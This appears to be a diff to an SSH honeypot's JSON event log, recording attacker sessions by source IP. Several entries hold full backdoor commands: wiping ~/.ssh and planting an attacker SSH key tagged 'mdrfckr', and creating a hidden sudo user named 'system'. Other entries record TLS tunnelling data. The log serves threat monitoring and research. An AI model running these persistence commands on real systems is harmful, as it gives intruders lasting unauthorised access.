@@ -379,6 +379,18 @@
             "session": "db00eab3f05b"
         },
         {
+            "timestamp": "2023-11-08T21:46:06.426114Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03\\xa6\\x90J$sZKI\\xad\\xc9\\x97\\xcf\\x12\\xdcp*\\x92\\xde\\xd4\\xb7u\\xb0\\xdf\\x7f\\xff\\xb6\\x81\\xfe?\\x80\\x12C WV2~\\xd6\\xe5,+4\\xa5\\x978s\\xf2n\\x86\\xc8\"\\xcf\\x16T\\x92\\x19\\x83g\\x18\\xcefk\\xbe\\xb5@\\x00V\\x13\\x02\\x13\\x03\\x13\\x01\\xc0,\\xc00\\xc0+\\xc0/\\xcc\\xa9\\xcc\\xa8\\x00\\x9f\\x00\\x9e\\xcc\\xaa\\xc0\\xaf\\xc0\\xad\\xc0\\xae\\xc0\\xac\\xc0$\\xc0(\\xc0#\\xc0\\'\\xc0\\n\\xc0\\x14\\xc0\\t\\xc0\\x13\\xc0\\xa3\\xc0\\x9f\\xc0\\xa2\\xc0\\x9e\\x00k\\x00g\\x009\\x003\\x00\\x9d\\x00\\x9c\\xc0\\xa1\\xc0\\x9d\\xc0\\xa0\\xc0\\x9c\\x00=\\x00<\\x005\\x00/\\x00\\xff\\x01\\x00\\x01]\\x00\\x00\\x00\\x13\\x00\\x11\\x00\\x00\\x0ewww.google.com\\x00\\x0b\\x00\\x04\\x03\\x00\\x01\\x02\\x00\\n\\x00\\x0c\\x00\\n\\x00\\x1d\\x00\\x17\\x00\\x1e\\x00\\x19\\x00\\x18\\x00\\x10\\x00\\x0b\\x00\\t\\x08http/1.1\\x00\\x16\\x00\\x00\\x00\\x17\\x00\\x00\\x001\\x00\\x00\\x00\\r\\x00*\\x00(\\x04\\x03\\x05\\x03\\x06\\x03\\x08\\x07\\x08\\x08\\x08\\t\\x08\\n\\x08\\x0b\\x08\\x04\\x08\\x05\\x08\\x06\\x04\\x01\\x05\\x01\\x06\\x01\\x03\\x03\\x03\\x01\\x03\\x02\\x04\\x02\\x05\\x02\\x06\\x02\\x00+\\x00\\x05\\x04\\x03\\x04\\x03\\x03\\x00-\\x00\\x02\\x01\\x01\\x003\\x00&\\x00$\\x00\\x1d\\x00 \\x11\\x19a-\\n8 \\xf9\\x1a\\xe8\\x93\\x85\\xe2M!y2\\x96\\x82\\x08=\\xb2\\x85\\xbc\\xb6\\x1c\\xda\\xb3Jeb\\x1c\\x00\\x15\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'",
+            "session": "a1fe325e3e45"
+        },
+        {
+            "timestamp": "2023-11-08T21:46:06.767620Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b\"\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03\\xd4j\\xd6{\\xdfX\\x8e\\xe5C\\xa5\\xfcc\\xb3\\x8fY\\x8f\\x8dQ\\x9e2\\xf1\\xdf\\xd2\\n\\xd4\\xbf\\xae\\x1d9>\\x7f\\x9d b\\xe3\\xfdz\\xdaI\\xa5\\xf7\\xfa\\x1b\\x94\\xf9\\x06\\x8d/\\x85\\xa6\\xae\\xae\\x82p\\xef\\xde\\x06\\xea[\\xe1\\xa1\\x98\\x18\\xd4%\\x00V\\x13\\x02\\x13\\x03\\x13\\x01\\xc0,\\xc00\\xc0+\\xc0/\\xcc\\xa9\\xcc\\xa8\\x00\\x9f\\x00\\x9e\\xcc\\xaa\\xc0\\xaf\\xc0\\xad\\xc0\\xae\\xc0\\xac\\xc0$\\xc0(\\xc0#\\xc0'\\xc0\\n\\xc0\\x14\\xc0\\t\\xc0\\x13\\xc0\\xa3\\xc0\\x9f\\xc0\\xa2\\xc0\\x9e\\x00k\\x00g\\x009\\x003\\x00\\x9d\\x00\\x9c\\xc0\\xa1\\xc0\\x9d\\xc0\\xa0\\xc0\\x9c\\x00=\\x00<\\x005\\x00/\\x00\\xff\\x01\\x00\\x01]\\x00\\x00\\x00\\x0e\\x00\\x0c\\x00\\x00\\tipinfo.io\\x00\\x0b\\x00\\x04\\x03\\x00\\x01\\x02\\x00\\n\\x00\\x0c\\x00\\n\\x00\\x1d\\x00\\x17\\x00\\x1e\\x00\\x19\\x00\\x18\\x00\\x10\\x00\\x0b\\x00\\t\\x08http/1.1\\x00\\x16\\x00\\x00\\x00\\x17\\x00\\x00\\x001\\x00\\x00\\x00\\r\\x00*\\x00(\\x04\\x03\\x05\\x03\\x06\\x03\\x08\\x07\\x08\\x08\\x08\\t\\x08\\n\\x08\\x0b\\x08\\x04\\x08\\x05\\x08\\x06\\x04\\x01\\x05\\x01\\x06\\x01\\x03\\x03\\x03\\x01\\x03\\x02\\x04\\x02\\x05\\x02\\x06\\x02\\x00+\\x00\\x05\\x04\\x03\\x04\\x03\\x03\\x00-\\x00\\x02\\x01\\x01\\x003\\x00&\\x00$\\x00\\x1d\\x00 |6,\\x99\\xa0\\xf3\\x8a\\xcc#\\xe3m\\x88\\x84j.\\xfc\\xee5\\xf6s\\x01\\x0e\\xcdbx\\xd2}d\\xdf\\xa4\\xfe!\\x00\\x15\\x00\\xad\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"",
+            "session": "a1fe325e3e45"
+        },
+        {
             "timestamp": "2023-11-06T09:26:33.036262Z",
             "event": "direct_tcpip_data",
             "details": "TCP/IP Data: b'\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03[\\xbf\\x9bGk3\\'ch\\x9e\\x02\\\\\\xa1p\\xb9\\xea\\x18\\x03cc\\xb3\\xd1\\x9f\\xff\\xda\\x80\\x12Oy_\\x9a\\xa3 \\x0cZ\\xf51\\x82\\x8c\\'\\xde\\x8dU\\x8aZ\\xf9\\xf9TD\\x00\\xbe\\xad\\xb1J\\xcb\\xd3#gU\\xd3\\xe6\\x94\\xb36O\\x00V\\x13\\x02\\x13\\x03\\x13\\x01\\xc0,\\xc00\\xc0+\\xc0/\\xcc\\xa9\\xcc\\xa8\\x00\\x9f\\x00\\x9e\\xcc\\xaa\\xc0\\xaf\\xc0\\xad\\xc0\\xae\\xc0\\xac\\xc0$\\xc0(\\xc0#\\xc0\\'\\xc0\\n\\xc0\\x14\\xc0\\t\\xc0\\x13\\xc0\\xa3\\xc0\\x9f\\xc0\\xa2\\xc0\\x9e\\x00k\\x00g\\x009\\x003\\x00\\x9d\\x00\\x9c\\xc0\\xa1\\xc0\\x9d\\xc0\\xa0\\xc0\\x9c\\x00=\\x00<\\x005\\x00/\\x00\\xff\\x01\\x00\\x01]\\x00\\x00\\x00\\x13\\x00\\x11\\x00\\x00\\x0ewww.google.com\\x00\\x0b\\x00\\x04\\x03\\x00\\x01\\x02\\x00\\n\\x00\\x0c\\x00\\n\\x00\\x1d\\x00\\x17\\x00\\x1e\\x00\\x19\\x00\\x18\\x00\\x10\\x00\\x0b\\x00\\t\\x08http/1.1\\x00\\x16\\x00\\x00\\x00\\x17\\x00\\x00\\x001\\x00\\x00\\x00\\r\\x00*\\x00(\\x04\\x03\\x05\\x03\\x06\\x03\\x08\\x07\\x08\\x08\\x08\\t\\x08\\n\\x08\\x0b\\x08\\x04\\x08\\x05\\x08\\x06\\x04\\x01\\x05\\x01\\x06\\x01\\x03\\x03\\x03\\x01\\x03\\x02\\x04\\x02\\x05\\x02\\x06\\x02\\x00+\\x00\\x05\\x04\\x03\\x04\\x03\\x03\\x00-\\x00\\x02\\x01\\x01\\x003\\x00&\\x00$\\x00\\x1d\\x00 \\\\\\x14S\\xe1\\xc8\\x19\\x05y{\\x15s\\x7f\"4\\xe5\\xc4\\x01\\xc5?\\xb4\\x97\\xfc\\x95\\x9e\\xe1\\x11\\xe5S\\x06}\\xb9\\x0c\\x00\\x15\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'",
@@ -747,6 +759,18 @@
             "event": "command_input",
             "input": "openssl passwd -1 bprfhGB4",
             "session": "e83cd4ee3970"
+        },
+        {
+            "timestamp": "2023-11-08T22:03:36.522635Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ne2ypqJY) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "bfc39e8ebd66"
+        },
+        {
+            "timestamp": "2023-11-08T22:03:36.523051Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 ne2ypqJY",
+            "session": "bfc39e8ebd66"
         }
     ],
     "43.156.49.75": [
@@ -1683,6 +1707,24 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "0f2cd36f862b"
+        },
+        {
+            "timestamp": "2023-11-08T21:24:31.312545Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "a871a773acf1"
+        },
+        {
+            "timestamp": "2023-11-08T21:24:31.390060Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "a871a773acf1"
+        },
+        {
+            "timestamp": "2023-11-08T21:24:31.412066Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "a871a773acf1"
         }
     ],
     "154.73.25.116": [
@@ -1703,6 +1745,148 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "6715ccb9feb3"
+        },
+        {
+            "timestamp": "2023-11-08T21:14:01.326435Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "9b6d1907071f"
+        },
+        {
+            "timestamp": "2023-11-08T21:14:02.140576Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "9b6d1907071f"
+        },
+        {
+            "timestamp": "2023-11-08T21:14:02.407629Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "9b6d1907071f"
+        }
+    ],
+    "36.92.107.123": [
+        {
+            "timestamp": "2023-11-08T21:19:54.680269Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "233e88f31bb2"
+        },
+        {
+            "timestamp": "2023-11-08T21:19:55.373100Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "233e88f31bb2"
+        },
+        {
+            "timestamp": "2023-11-08T21:19:55.584662Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "233e88f31bb2"
+        },
+        {
+            "timestamp": "2023-11-08T21:22:15.164805Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "c5ec5b66aaf3"
+        },
+        {
+            "timestamp": "2023-11-08T21:22:15.943927Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "c5ec5b66aaf3"
+        },
+        {
+            "timestamp": "2023-11-08T21:22:16.159925Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "c5ec5b66aaf3"
+        }
+    ],
+    "185.220.102.4": [
+        {
+            "timestamp": "2023-11-08T21:44:36.707073Z",
+            "event": "direct_tcpip_data",
+            "details": "TCP/IP Data: b'\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03z(|\\\\W}\\x00\"\\x7fJ\\xa9\\xc4\\x13\\x99\\xf0\\x00\\xc8/\\xea\\xfe\\n\\x91\\xe2\\xab\\xe7Z\\xb4\\x1e\\x8c\\xf5\\xbc* \\xffA1J\\xa6V\\x91\\x19\\xed6F\\xeci\\xe9\\xe4\\xc1f\\xbb\\x7f@&\\xc9\\x11|\\xf7\\x92o2\\x88&\\xf3\\'\\x00>\\x13\\x02\\x13\\x03\\x13\\x01\\xc0,\\xc00\\x00\\x9f\\xcc\\xa9\\xcc\\xa8\\xcc\\xaa\\xc0+\\xc0/\\x00\\x9e\\xc0$\\xc0(\\x00k\\xc0#\\xc0\\'\\x00g\\xc0\\n\\xc0\\x14\\x009\\xc0\\t\\xc0\\x13\\x003\\x00\\x9d\\x00\\x9c\\x00=\\x00<\\x005\\x00/\\x00\\xff\\x01\\x00\\x01u\\x00\\x00\\x00\\x0f\\x00\\r\\x00\\x00\\ngoogle.com\\x00\\x0b\\x00\\x04\\x03\\x00\\x01\\x02\\x00\\n\\x00\\x0c\\x00\\n\\x00\\x1d\\x00\\x17\\x00\\x1e\\x00\\x19\\x00\\x18\\x00\\x10\\x00\\x0e\\x00\\x0c\\x02h2\\x08http/1.1\\x00\\x16\\x00\\x00\\x00\\x17\\x00\\x00\\x001\\x00\\x00\\x00\\r\\x000\\x00.\\x04\\x03\\x05\\x03\\x06\\x03\\x08\\x07\\x08\\x08\\x08\\t\\x08\\n\\x08\\x0b\\x08\\x04\\x08\\x05\\x08\\x06\\x04\\x01\\x05\\x01\\x06\\x01\\x03\\x03\\x02\\x03\\x03\\x01\\x02\\x01\\x03\\x02\\x02\\x02\\x04\\x02\\x05\\x02\\x06\\x02\\x00+\\x00\\t\\x08\\x03\\x04\\x03\\x03\\x03\\x02\\x03\\x01\\x00-\\x00\\x02\\x01\\x01\\x003\\x00&\\x00$\\x00\\x1d\\x00 \\xa2\\xa2/\\xe0XxU3\\xad\\x1a\\xd3\\xc8\\xdc\\x1ee*Vm\\t\\x16Z\\xe8\\xfb\\x81\\x8a\\xc0j\\x11\\x87;91\\x00\\x15\\x00\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'",
+            "session": "2998d02b10d9"
+        }
+    ],
+    "62.234.47.75": [
+        {
+            "timestamp": "2023-11-08T21:57:08.615518Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "d19676f30785"
+        },
+        {
+            "timestamp": "2023-11-08T21:57:09.150108Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "d19676f30785"
+        },
+        {
+            "timestamp": "2023-11-08T21:57:09.324385Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "d19676f30785"
+        }
+    ],
+    "103.97.177.186": [
+        {
+            "timestamp": "2023-11-08T22:03:47.567940Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "b0302c3777ff"
+        },
+        {
+            "timestamp": "2023-11-08T22:03:48.081935Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "b0302c3777ff"
+        },
+        {
+            "timestamp": "2023-11-08T22:03:48.248013Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "b0302c3777ff"
+        }
+    ],
+    "124.222.229.134": [
+        {
+            "timestamp": "2023-11-08T22:08:20.435589Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "758910f81f23"
+        },
+        {
+            "timestamp": "2023-11-08T22:08:21.007817Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "758910f81f23"
+        },
+        {
+            "timestamp": "2023-11-08T22:08:21.181125Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "758910f81f23"
+        },
+        {
+            "timestamp": "2023-11-08T22:09:56.484324Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "29ff3158e37d"
+        },
+        {
+            "timestamp": "2023-11-08T22:09:57.174037Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "29ff3158e37d"
+        },
+        {
+            "timestamp": "2023-11-08T22:09:57.368969Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "29ff3158e37d"
         }
     ],
     "159.65.146.149": [
